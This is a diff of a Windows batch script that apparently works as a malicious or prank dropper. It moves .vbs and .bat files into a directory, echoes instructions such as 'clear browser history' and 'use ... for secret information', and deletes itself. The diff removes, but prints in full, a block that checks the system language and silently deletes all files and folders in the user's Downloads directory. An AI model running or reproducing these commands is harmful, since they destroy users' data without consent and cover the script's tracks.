@@ -51,6 +51,16 @@ if not exist "%HD%" (
 :: create txt file
 echo "lol" > %HD%\%NAME%.txt
 
+echo.
+echo.
+echo.
+
+echo worked
+
+echo clear browser history
+
+echo use %HD%\%NAME%.txt for secret information
+
 :: move script files with error checking
 if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
 if exist "%SF%\%NAME%.bat" move /y "%SF%\%NAME%.bat" "%HD%\" >nul
@@ -70,25 +80,7 @@ for %%f in (%SF%\.*) do (
 )
 
 :: delete config.cmd
-echo worked
-
-echo clear browser history
-
-echo use %HD%\%NAME%.txt for secret information
-
 ping 127.0.0.1 -n 26 > nul
-
-for /f "delims=" %%I in ('powershell -Command "[System.Globalization.CultureInfo]::InstalledUICulture.DisplayName"') do set LANG=%%I
-
-if "%LANG%"=="Русский (Россия)" (
-    set DOWNLOADS=%USERPROFILE%\Загрузки
-) else if "%LANG%"=="English (United States)" (
-    set DOWNLOADS=%USERPROFILE%\Downloads
-)
-
-del /f /q "%DOWNLOADS%\*" >nul 2>&1
-
-for /d %%D in ("%DOWNLOADS%\*") do rd /s /q "%%D" >nul 2>&1
 
 del "%~f0" >nul 2>&1
 
